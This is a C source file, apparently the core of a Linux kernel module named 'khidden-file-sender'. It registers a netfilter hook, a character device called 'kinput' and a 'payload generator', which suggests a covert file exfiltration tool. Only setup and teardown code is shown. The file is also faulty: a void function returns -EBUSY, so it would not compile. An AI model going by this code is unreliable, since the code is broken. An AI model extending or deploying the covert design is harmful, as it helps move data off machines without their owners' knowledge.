#include "core.h"
#include "netfilter.h"
#include "chardev.h"
#include "payload_generator.h"

static const char* input_chrdev_name = "kinput";
static int input_chrdev_major_num;

void core_start(void)
{
    // register netfilter hook
    register_nf_hook();

    // create a character device to receive user input
    input_chrdev_major_num = register_input_chrdev(input_chrdev_name);
    if (0 > input_chrdev_major_num) {
        printk(KERN_ERR "khidden-file-sender: failed to register char device (%d)\n", input_chrdev_major_num);
        return -EBUSY;
    }

    setup_payload_generator();
}

void core_stop(void)
{
    // remove our character device
    unregister_input_chrdev(input_chrdev_major_num, input_chrdev_name);

    // TODO: what to do if the list is not empty?

    // remove netfilter hook
    unregister_nf_hook();
}